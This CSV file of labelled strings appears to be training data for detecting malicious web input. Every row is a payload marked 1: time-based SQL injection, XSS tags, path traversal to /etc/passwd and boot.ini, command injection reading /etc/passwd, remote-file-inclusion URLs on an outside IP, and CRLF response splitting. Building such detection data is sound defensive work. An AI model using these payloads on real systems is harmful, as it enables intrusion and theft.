Sentence,Label
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",1
 ORDER BY SLEEP ( 2 ) ,1
" ORDER BY 1,SLEEP ( 2 ) ",1
" ORDER BY 1,SLEEP ( 2 ) ,3",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",1
 ORDER BY SLEEP ( 5 ) #,1
" ORDER BY 1,SLEEP ( 5 ) #",1
" ORDER BY 1,SLEEP ( 5 ) ,3#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",1
" ORDER BY 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",1
 ORDER BY SLEEP ( 2 ) #,1
" ORDER BY 1,SLEEP ( 2 ) #",1
" ORDER BY 1,SLEEP ( 2 ) ,3#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",1
" ORDER BY 1,SLEEP ( 2 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",1
"'"" HAVING '""1""' = '""1""'",1
"'"" HAVING '""1""' = '""1""'#",1
"'"" HAVING '""1""' = '""1""'--",1
"'"" HAVING '""1""' = '""1""'#--",1
"'"" HAVING '""1""' = '""0""'",1
"'"" HAVING '""1""' = '""0""'#",1
"'"" HAVING '""1""' = '""0""'--",1
"'"" ORDER BY '""1",1
"'"" ORDER BY '""2",1
"'"" ORDER BY '""3",1
"'"" ORDER BY '""4",1
"'"" ORDER BY '""5",1
"'"" ORDER BY '""6",1
"'"" ORDER BY '""7",1
"'"" ORDER BY '""8",1
"'"" ORDER BY '""9",1
"'"" ORDER BY '""10",1
"'"" ORDER BY '""11",1
"'"" ORDER BY '""12",1
"'"" ORDER BY '""13",1
"'"" ORDER BY '""14",1
"'"" ORDER BY '""15",1
"'"" ORDER BY '""16",1
"'"" ORDER BY '""17",1
"'"" ORDER BY '""18",1
"'"" ORDER BY '""19",1
"'"" ORDER BY '""20",1
"'"" ORDER BY '""21",1
"'"" ORDER BY '""22",1
"'"" ORDER BY '""23",1
"'"" ORDER BY '""24",1
"'"" ORDER BY '""25",1
"'"" ORDER BY '""26",1
"'"" ORDER BY '""27",1
"'"" ORDER BY '""28",1
"'"" ORDER BY '""29",1
"'"" ORDER BY '""30",1
"'"" ORDER BY '""1'""#",1
"'"" ORDER BY '""2'""#",1
"'"" ORDER BY '""3'""#",1
"'"" ORDER BY '""4'""#",1
"'"" ORDER BY '""5'""#",1
"'"" ORDER BY '""6'""#",1
"'"" ORDER BY '""7'""#",1
"'"" ORDER BY '""8'""#",1
"'"" ORDER BY '""9'""#",1
"'"" ORDER BY '""10'""#",1
"'"" ORDER BY '""11'""#",1
"'"" ORDER BY '""12'""#",1
"'"" ORDER BY '""13'""#",1
"'"" ORDER BY '""14'""#",1
"'"" ORDER BY '""15'""#",1
"'"" ORDER BY '""16'""#",1
"'"" ORDER BY '""17'""#",1
"'"" ORDER BY '""18'""#",1
"'"" ORDER BY '""19'""#",1
"'"" ORDER BY '""20'""#",1
"'"" ORDER BY '""21'""#",1
"'"" ORDER BY '""22'""#",1
"'"" ORDER BY '""23'""#",1
"'"" ORDER BY '""24'""#",1
"'"" ORDER BY '""25'""#",1
"'"" ORDER BY '""26'""#",1
"'"" ORDER BY '""27'""#",1
"'"" ORDER BY '""28'""#",1
"'"" ORDER BY '""29'""#",1
"'"" ORDER BY '""30'""#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""1",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""1""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""1""'--",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""1""'#--",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""2""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""3""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""4""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""5""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""6""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""7""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""8""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""9""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""10""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""11""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""12""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""13""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""14""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""15""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""16""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""17""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""18""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""19""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""20""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""21""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""22""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""23""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""24""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""25""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""26""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""27""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""28""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""29""'#",1
"'"" HAVING '""1""' = '""1""' ORDER BY '""30""'#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,""'3",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,""'3'""#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",1
"'"" UNION SELECT 1,SLEEP ( 5 ) ,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",1
1 or 1 = 1#,1
 <  / script > alert ( 1 )  ;  <  / script >  < !--,1
""" >  <  / script > alert ( 1 )  ;  <  / script >  < !--",1
" < img src =  /  onerror = ""alert ( String.fromCharCode ( 88,83,83  )  )  "" >  <  / img > ",1
" < img src =  /  onerror = ""alert ( String.fromCharCode ( 88,83,83  )  )  "" >  <  / img >  < !--",1
test <  / title >  < !--,1
""" >  < h1 > Hacked <  / h1 > ",1
test <  / body >  <  / html >  < !--,1
alert ( 1 )  ;  <  / script >  < !--,1
C :  \  boot.ini,1
 / etc / passwd,1
http :  /   / 135.23.158.130 / .testing / redirect_vuln.txt,1
http :  /   / 135.23.158.130 / .testing / redirect_vuln.txt%00,1
http :  /   / 135.23.158.130 / .testing / rfi_vuln.txt,1
http :  /   / 135.23.158.130 / .testing / rfi_vuln.txt%00,1
http :  /   / 135.23.158.130 / .testing / rfi_vuln.php,1
http :  /   / 135.23.158.130 / .testing / rfi_vuln.php%00,1
http :  /   / 135.23.158.130 / .testing / xss_vuln.php,1
http :  /   / 135.23.158.130 / .testing / xss_vuln.php%00,1
http :  /   / 135.23.158.130 / .testing / xss_vuln.html,1
http :  /   / 135.23.158.130 / .testing / xss_vuln.html%00,1
http :  /   / 135.23.158.130 / .testing / xss.html,1
http :  /   / 135.23.158.130 / .testing / xss.html%00,1
http :  /   / 135.23.158.130 / .testing / iframe_injection.php,1
php :  /   / input,1
"data :  /   / text / plain ; base64,SmJhdHk4Y1dIbFJhemh6Q3lqQTw%2FcGhwIGVjaG8gJ1Z1bG5lcmFibGUnOyA%2FPkpiYXR5OGNXSGxSYXpoekN5akE%3D",1
"php :  /   / input ; base64,SmJhdHk4Y1dIbFJhemh6Q3lqQTw%2FcGhwIGVjaG8gJ1Z1bG5lcmFibGUnOyA%2FPkpiYXR5OGNXSGxSYXpoekN5akE%3D",1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / passwd,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / passwd%00,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  boot.ini,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  boot.ini%00,1
..  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ boot.ini,1
..  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ boot.ini%00,1
%0d%0aCONTENT-LENGTH: 0%0d%0a%0d%0aHTTP / 1.1 200 OK%0d%0aContent-Type: text / html%0d%0aCONTENT-LENGTH: 25%0d%0a%0d%0a < html > Hacked <  / html > ,1
%0dContent-Length: 0%0d%0dHTTP / 1.1 200 OK%0dContent-Type: text / html%0dContent-Length: 19%0d%0d < html > Hacked <  / html > ,1
127.0.0.1 ;  cat  / etc / passwd,1
127.0.0.1  &  cat  / etc / passwd,1
127.0.0.1  &  &  cat  / etc / passwd,1
 ;  cat  / etc / passwd,1
  &  cat  / etc / passwd,1
  &  &  cat  / etc / passwd,1
127.0.0.1 ;  pwd,1
127.0.0.1  &  pwd,1
127.0.0.1  &  &  pwd,1
 ;  cat pwd,1
  &  cat pwd,1
  &  &  cat pwd,1
',1
"""",1
' ) ,1
""" ) ",1
#,1
--,1
 / *,1
""" >  < script > alert ( 1 )  ;  <  / script > ",1
' >  < script > alert ( 1 )  ;  <  / script > ,1
""" >  <  / textarea >  < script > alert ( 1 )  ;  <  / script > ",1
 < !-- ,1
9,1
99,1
999999999999999999999999999,1
999999999999999999999999999999999999999999999999999999,1
XXXXXXXXXXXXXXXXXXXXXXXXXXX,1
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX,1
